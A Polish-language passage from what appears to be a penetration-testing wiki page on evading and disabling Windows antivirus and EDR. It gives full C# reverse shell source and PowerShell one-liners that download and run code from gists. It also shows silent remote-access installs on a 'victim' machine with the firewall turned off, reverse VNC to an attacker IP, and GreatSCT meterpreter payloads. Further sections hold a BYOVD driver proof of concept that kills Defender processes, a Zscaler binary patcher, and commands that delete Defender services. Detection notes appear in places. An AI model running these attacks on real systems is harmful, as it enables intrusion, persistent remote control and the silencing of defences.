1. Pobierz program ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla Windows, aby go pobrać.
2. Uruchom instalator po cichu na komputerze ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij „Next”. Kreator poprosi o autoryzację; kliknij przycisk „Authorize”, aby kontynuować.
4. Wykonaj podane polecenie, wprowadzając wymagane zmiany: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametr `--pin` ustawia PIN bez użycia GUI).
 

## Zaawansowane unikanie wykrywania

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Unikanie wykrywania to bardzo złożony temat. Czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, dlatego w dojrzałych środowiskach całkowite uniknięcie wykrycia jest praktycznie niemożliwe.

Każde środowisko, w którym będziesz działać, ma własne mocne i słabe strony.

Zdecydowanie zachęcam do obejrzenia tej prelekcji [@ATTL4S](https://twitter.com/DaniLJ94), aby poznać podstawy bardziej zaawansowanych technik unikania wykrywania.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także świetna prelekcja [@mariuszbit](https://twitter.com/mariuszbit) na temat wielowarstwowego unikania wykrywania.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare techniki**

### **Sprawdzanie, które części Defender uznaje za złośliwe**

Możesz użyć narzędzia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), które będzie **usuwać części pliku binarnego**, aż **ustali, którą jego część Defender** uznaje za złośliwą, a następnie wyodrębni ją dla Ciebie.\
Innym narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred), które udostępnia tę usługę w otwartym internecie pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serwer Telnet**

Do Windows 10 wszystkie wersje Windows zawierały **serwer Telnet**, który można było zainstalować (jako administrator), wykonując:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Niech **uruchamia się** przy starcie systemu i **uruchom** go teraz:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Zmień port telnetu** (stealth) i wyłącz zaporę:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebne są pliki binarne, a nie instalator)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ i **nowo** utworzony plik _**UltraVNC.ini**_ na **komputer ofiary**

#### **Połączenie zwrotne**

**Atakujący** powinien **uruchomić na swoim** **hoście** plik binarny `vncviewer.exe -listen 5900`, aby był **gotowy** do odebrania zwrotnego **połączenia VNC**. Następnie na **komputerze ofiary**: uruchom demona winvnc `winvnc.exe -run` i wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować dyskrecję, nie wolno robić kilku rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [wyskakujące okienko](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa, poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [okna konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, aby wyświetlić pomoc, bo wywołasz [wyskakujące okienko](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

W GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Teraz **uruchom listener** za pomocą `msfconsole -r file.rc` i **wykonaj** **xml payload** przy użyciu:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Obecny defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Użyj tego z:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# przy użyciu kompilatora

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia Pythona do budowania injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Zabijanie AV/EDR z przestrzeni kernel

Storm-2603 wykorzystał niewielkie narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć zabezpieczenia endpointów przed wdrożeniem ransomware. Narzędzie dostarcza **własny podatny, ale *podpisany* driver** i wykorzystuje go do wykonywania uprzywilejowanych operacji w kernelu, których nie mogą zablokować nawet usługi AV działające w trybie Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Najważniejsze wnioski
1. **Podpisany driver**: Plik zapisywany na dysku to `ServiceMouse.sys`, ale plik binarny jest legalnie podpisanym driverem `AToolsKrnl64.sys` z „System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ driver ma ważny podpis Microsoftu, ładuje się nawet wtedy, gdy włączone jest Driver-Signature-Enforcement (DSE).
2. **Instalacja usługi**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Pierwszy wiersz rejestruje sterownik jako **kernel service**, a drugi go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z userland.
3. **IOCTL udostępniane przez sterownik**
   | Kod IOCTL | Możliwość                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Zakończenie dowolnego procesu na podstawie PID (używane do zabijania usług Defender/EDR) |
   | `0x990000D0` | Usunięcie dowolnego pliku z dysku |
   | `0x990001D0` | Wyładowanie sterownika i usunięcie usługi |

   Minimalny proof-of-concept w C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Dlaczego to działa**: BYOVD całkowicie omija zabezpieczenia działające w trybie użytkownika; kod wykonywany w jądrze może otwierać *chronione* procesy, kończyć je lub manipulować obiektami jądra, niezależnie od PPL/PP, ELAM i innych funkcji hardeningu.

Wykrywanie / środki zaradcze
• Włącz listę blokowanych podatnych sterowników Microsoftu (`HVCI`, `Smart App Control`), aby system Windows odmawiał załadowania `AToolsKrnl64.sys`.
• Monitoruj tworzenie nowych usług *jądra* i generuj alerty, gdy sterownik zostanie załadowany z katalogu z prawem zapisu dla wszystkich lub nie znajduje się na liście dozwolonych.
• Obserwuj uchwyty z trybu użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie kontroli stanu urządzenia Zscaler Client Connector przez poprawianie binariów na dysku

**Client Connector** firmy Zscaler lokalnie stosuje reguły stanu urządzenia i korzysta z Windows RPC, aby przekazywać wyniki innym komponentom. Dwie słabe decyzje projektowe umożliwiają całkowite obejście zabezpieczeń:

1. Ocena stanu urządzenia odbywa się **wyłącznie po stronie klienta** (na serwer wysyłana jest wartość logiczna).
2. Wewnętrzne punkty końcowe RPC sprawdzają jedynie, czy podłączany plik wykonywalny jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Oba mechanizmy można unieszkodliwić, **poprawiając cztery podpisane binaria na dysku**:

| Binarium | Oryginalna logika poddana poprawce | Wynik |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola kończy się wynikiem zgodnym |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | Zastąpione instrukcjami NOP ⇒ dowolny proces (nawet niepodpisany) może połączyć się z potokami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominięte |

Fragment minimalnego patchera:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole stanu wyświetlają status **zielony/zgodny**.
* Niepodpisane lub zmodyfikowane pliki binarne mogą otwierać endpointy RPC nazwanych potoków (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Naruszony host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez zasady Zscaler.

To studium przypadku pokazuje, jak kilka modyfikacji bajtów może obejść decyzje o zaufaniu podejmowane wyłącznie po stronie klienta oraz proste kontrole podpisu.

## Microsoft Defender `BTR.sys` — nadużywanie zaufanej funkcjonalności

Sterownik **Boot-Time Removal** programu Defender stanowi użyteczny kontrprzykład dla klasycznego BYOVD. `BTR.sys` to legalny komponent naprawczy podpisany przez Microsoft, bez błędu uszkodzenia pamięci i interfejsu IOCTL; po uzyskaniu uprawnień administratora i `SeLoadDriverPrivilege` operator może zamiast tego sfałszować prywatną transakcję naprawczą i uzyskać dostęp do zamierzonych operacji na plikach/rejestrze w Ring-0. Jest to **prymityw neutralizacji AV/EDR po kompromitacji, a nie initial access ani privilege escalation**. Sterownik można wyodrębnić z zasobu `BOOTTIMETOOL` pliku `MpEngine.dll` znajdującego się na zaatakowanym hoście, zamiast importować rzucający się w oczy sterownik innej firmy.<sup>[[36]](#references)</sup>

### Przygotowanie jednorazowego sterownika

Defender zwykle zapisuje zasób jako plik o losowej nazwie `[a-z]{8}.sys` i rejestruje usługę jądra o podobnej nazwie. `DriverEntry` odczytuje wartość `Args` usługi, otwiera wskazany NTFS ADS, odszyfrowuje i weryfikuje listę działań, zapisuje informację zwrotną i po pomyślnym wykonaniu zwraca `0xC0000056` (`STATUS_DELETE_PENDING`), dzięki czemu sterownik zostaje wyładowany, zamiast pozostać załadowany. Sfałszowana usługa ma następujące charakterystyczne wartości.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Strumień `:changelist` zawiera jeden blob zaszyfrowany RC4. Analizowane kompilacje używają ponownie stałego klucza 256-bajtowego, więc szyfrowanie nie stanowi granicy autoryzacji. Prawidłowy tekst jawny zawiera 24-bajtowy nagłówek globalny (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC nagłówka i identyfikator transakcji wyprowadzony z payloadu), po którym następuje zakończona znakiem null ścieżka feedbacku w UTF-16 oraz dowolna liczba elementów. Każdy element ma 16-bajtowy nagłówek (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) oraz dane zależne od akcji, zakończone **dokładnie czterema bajtami NUL**. Każdy region nagłówka/danych jest weryfikowany niezależnie przy użyciu wielomianu CRC-32 `0xEDB88320`, stanu początkowego `0xFFFFFFFF` i **bez końcowego XOR** (`~CRC32`); stan CRC jest resetowany dla każdego regionu.<sup>[[36]](#references)[[37]](#references)</sup>

Akceptowane identyfikatory akcji udostępniają następujące prymitywy jądra.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dane elementu | Wynik |
| --- | --- | --- |
| 1 | `[ścieżka UTF-16]` | Usunięcie pliku, także zablokowanego |
| 2 | `[ścieżka UTF-16]` | Usunięcie pustego katalogu |
| 3 | `[Flags][źródło][cel]` | Przeniesienie pliku do chronionej ścieżki wybranej przez atakującego; pusty cel oznacza usunięcie |
| 4 | `[Flags][ścieżka klucza]` | Rekurencyjne usunięcie klucza rejestru |
| 5 | `[Flags][ścieżka klucza + "\\" + wartość]` | Usunięcie wartości rejestru |
| 6 | `[Flags][typ][rozmiar][ścieżka klucza + "\\" + wartość][dane]` | Utworzenie/aktualizacja wartości rejestru i utworzenie brakujących ścieżek kluczy |

W przypadku akcji 5 i 6 separator klucza/wartości w formacie wire to **dwa kolejne ukośniki odwrotne**; ścieżka sformatowana zgodnie ze zwyczajową konwencją nie zostanie poprawnie podzielona. Plik feedbacku w większości odzwierciedla żądanie, ale pierwsze cztery bajty danych każdego elementu stają się jego wynikowym `NTSTATUS`. W przypadku akcji 1 i 2, które nie mają początkowego pola flags, BTR przenosi ścieżkę do czterech zarezerwowanych bajtów końcowych, aby zrobić miejsce na ten status.<sup>[[36]](#references)</sup>

### Przepływ pracy `BTR_CLI` i okno wczesnego rozruchu

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) realizuje cały łańcuch: wyodrębnia `BTR.sys` z lokalnego Defendera, tworzy `<random>.sys:changelist` oraz strumień feedbacku, serializuje, sumuje kontrolnie i szyfruje łańcuchowe akcje, bezpośrednio tworzy klucz usługi w rejestrze, a następnie wywołuje `NtLoadDriver` dla `-trigger now` lub pozostawia sterownik jako uruchamiany przy starcie systemu dla `-trigger boot`. Bezpośrednie przygotowanie wpisu w rejestrze omija standardową ścieżkę SCM `CreateServiceW`, dlatego **nie generuje** zdarzenia instalacji usługi o identyfikatorze 7045. Artefakty uruchamiane podczas rozruchu można później usunąć poleceniem `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nie nadaje się do użycia, ponieważ BTR wykonuje operacje wejścia/wyjścia na plikach z poziomu `DriverEntry`, zanim stos pamięci masowej i łącze `SystemRoot` będą gotowe. `Start=1` wraz z grupą o wysokim priorytecie `Boot Bus Extender` powoduje uruchomienie w fazie 1: NTFS jest już dostępny, ale wiele sterowników zabezpieczeń uruchamianych podczas startu systemu oraz usług EDR działających w trybie użytkownika nie zostało jeszcze zainicjowanych. Filtry uruchamiane podczas startu systemu, takie jak `WdFilter`, mogą być już załadowane, ale BTR może usunąć ich pliki binarne lub konfigurację usług przed kolejnym uruchomieniem systemu, a pliki wykonywalne usług — zanim SCM je uruchomi. ELAM nie eliminuje tego problemu, ponieważ BTR działa po ocenie sterowników uruchamianych podczas rozruchu i ma prawidłowy podpis Microsoft.<sup>[[36]](#references)</sup>

W jednej transakcji wykonywanych jest wiele działań. PoC dodaje na początku działanie 1 dotyczące stałej ścieżki `\SystemRoot\Temp\BootClean.log`: BTR tworzy ten plik dziennika, a następnie przetwarza własne żądanie jego usunięcia i usuwa go przed wyładowaniem. Ogranicza to ilość śladów, a umieszczenie informacji zwrotnej w `<random>.sys:<random>.dat` pozwala usunąć sterownik i oba strumienie jednocześnie.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacje detekcyjne o wysokim poziomie sygnału

Reguły oparte wyłącznie na podpisach oraz lista blokowanych podatnych sterowników Microsoftu nie przeciwdziałają nadużywaniu zamierzonych funkcji BTR. Preferuj poniższe korelacje behawioralne, odróżniając przy tym uzasadnione pochodzenie od Defendera od uruchomienia przez dowolny program.<sup>[[36]](#references)</sup>

- **Sysmon 15:** utworzenie `.sys:changelist` występuje zawsze podczas przygotowywania BTR. ADS `.dat` dołączony do tego samego pliku `.sys` jest szczególnie podejrzany, ponieważ Defender zwykle umieszcza informacje zwrotne w `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** koreluj bezpośrednie utworzenie `HKLM\SYSTEM\CurrentControlSet\Services\<random>` zawierającego `Args=...:changelist` i `Group=Boot Bus Extender` z brakiem odpowiadającego mu zdarzenia instalacji SCM.
- **Sysmon 6 -> 23:** koreluj załadowanie znanego sterownika BTR spoza łańcucha pochodzenia Defendera z późniejszym usunięciem pliku przypisanym do `System`/PID 4, szczególnie w przypadku plików binarnych związanych z bezpieczeństwem.
- **Sysmon 11 -> 23:** generuj alerty o szybkim utworzeniu i usunięciu `\SystemRoot\Temp\BootClean.log` przez `System`/PID 4.
- Ogranicz i audytuj przypisywanie/włączanie uprawnienia `SeLoadDriverPrivilege`; sam podpis Microsoft nie gwarantuje zaufania, gdy sterownik narzędzia bezpieczeństwa jest przygotowywany przez `cmd.exe`, PowerShell lub nieznany proces.

## Nadużywanie Protected Process Light (PPL) do manipulowania AV/EDR za pomocą LOLBINs

Protected Process Light (PPL) wymusza hierarchię poziomów i podpisów, dzięki czemu procesy chronione mogą ingerować w siebie nawzajem tylko wtedy, gdy mają taki sam lub wyższy poziom ochrony. Z punktu widzenia atakującego, jeśli możesz zgodnie z uprawnieniami uruchomić plik binarny obsługujący PPL i kontrolować jego argumenty, możesz przekształcić nieszkodliwą funkcję (np. rejestrowanie) w ograniczony mechanizm zapisu chroniony przez PPL, działający na chronionych katalogach używanych przez AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Co sprawia, że proces działa jako PPL
- Docelowy plik EXE (oraz wszystkie załadowane biblioteki DLL) musi być podpisany przy użyciu EKU obsługującego PPL.
- Proces musi zostać utworzony za pomocą CreateProcess z następującymi flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego poziomu ochrony odpowiadającego podpisującemu plik binarny (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla podpisów antymalware, `PROTECTION_LEVEL_WINDOWS` dla podpisów Windows). Nieprawidłowe poziomy spowodują niepowodzenie tworzenia procesu.

Zobacz również szersze wprowadzenie do PP/PPL i ochrony LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia uruchamiające
- Pomocnicze narzędzie open source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego pliku EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schemat użycia:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Podpisany plik binarny systemu `C:\Windows\System32\ClipUp.exe` uruchamia sam siebie i przyjmuje parametr, który zapisuje plik dziennika w ścieżce wskazanej przez wywołującego.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie potrafi parsować ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać normalnie chronione lokalizacje.

Narzędzia pomocnicze do krótkich ścieżek 8.3
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Wyznacz krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Łańcuch nadużycia (w zarysie)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z użyciem `CREATE_PROTECTED_PROCESS` za pomocą programu uruchamiającego (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki pliku dziennika ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli AV zwykle otwiera/blokuje docelowy plik binarny podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu, zanim uruchomi się AV, instalując usługę autostartu, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność rozruchu za pomocą Process Monitor (rejestrowanie rozruchu).
4) Po ponownym uruchomieniu zapis z uprawnieniami PPL następuje przed zablokowaniem plików binarnych przez AV, uszkadzając docelowy plik i uniemożliwiając uruchomienie.

Przykładowe wywołanie (ścieżki zanonimizowane/skrócone ze względów bezpieczeństwa):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Uwagi i ograniczenia
- Nie można kontrolować zawartości zapisywanej przez ClipUp — poza jej lokalizacją; ta prymitywna technika nadaje się do uszkadzania, a nie precyzyjnego wstrzykiwania zawartości.
- Do zainstalowania/uruchomienia usługi i wykorzystania okna czasowego podczas ponownego uruchamiania wymagane są lokalne uprawnienia administratora/SYSTEM.
- Kluczowe jest wyczucie czasu: docelowy plik nie może być otwarty; wykonanie podczas rozruchu pozwala uniknąć blokad plików.

Wykrywanie
- Utworzenie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy jego procesem nadrzędnym są niestandardowe programy uruchamiające, w pobliżu momentu rozruchu.
- Nowe usługi skonfigurowane do automatycznego uruchamiania podejrzanych plików binarnych, które konsekwentnie startują przed Defender/AV. Zbadaj tworzenie/modyfikowanie usług przed awariami uruchamiania Defendera.
- Monitorowanie integralności plików binarnych/katalogów Platform Defendera; nieoczekiwane tworzenie/modyfikowanie plików przez procesy z flagami procesu chronionego.
- Telemetria ETW/EDR: szukaj procesów utworzonych z flagą `CREATE_PROTECTED_PROCESS` oraz anormalnego użycia poziomów PPL przez pliki binarne niezwiązane z AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane pliki binarne mogą działać jako PPL i w ramach jakich procesów nadrzędnych; blokuj uruchamianie ClipUp poza uzasadnionymi sytuacjami.
- Higiena usług: ograniczaj tworzenie/modyfikowanie usług uruchamianych automatycznie i monitoruj manipulowanie kolejnością uruchamiania.
- Upewnij się, że ochrona przed manipulacją Defendera i zabezpieczenia wczesnego uruchamiania są włączone; badaj błędy uruchamiania wskazujące na uszkodzenie plików binarnych.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach zawierających narzędzia bezpieczeństwa, jeśli jest to zgodne z Twoim środowiskiem (dokładnie to przetestuj).

## Manipulowanie Microsoft Defender przez przejęcie dowiązania symbolicznego do katalogu wersji Platform

Windows Defender wybiera platformę, z której działa, przez wyliczenie podfolderów w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

